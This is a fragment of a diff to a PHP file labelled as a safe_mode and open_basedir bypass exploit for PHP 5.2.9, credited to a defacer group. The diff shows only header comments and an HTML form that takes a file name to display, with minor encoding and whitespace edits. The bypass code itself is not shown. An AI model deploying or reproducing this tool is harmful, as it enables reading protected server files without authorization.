@@ -1,7 +1,7 @@
 <?php 
 /* 
 safe_mode and open_basedir Bypass PHP 5.2.9 
-KingDefacer ARCHÝVES / 
+KingDefacer ARCHï¿½VES / 
 
 This Exploit Was Edited By KingDefacer
 NOTE: 
@@ -18,7 +18,7 @@ Turkish H4CK3RZ
 <p><b> [Turkish Security Network] - Edited By KingDefacer
 <p>PHP 5.2.9 safe_mode & open_basedir bypass 
 <p>More: <a href="/">Md5Cracking.Com Crew</a> 
-<p><form name="form" action="http://'.$_SERVER["HTTP_HOST"].htmlspecialchars($_SERVER["SCRIPT_N 
+<p><form name="form" action="http://' .$_SERVER["HTTP_HOST"].htmlspecialchars($_SERVER["SCRIPT_N 
 AME"]).$_SERVER["PHP_SELF"].'" method="post"><input type="text" name="file" size="50" value="'.htmlspecialchars($file).'"><input type="submit" name="hardstylez" value="Show"></form>'; 
 
 
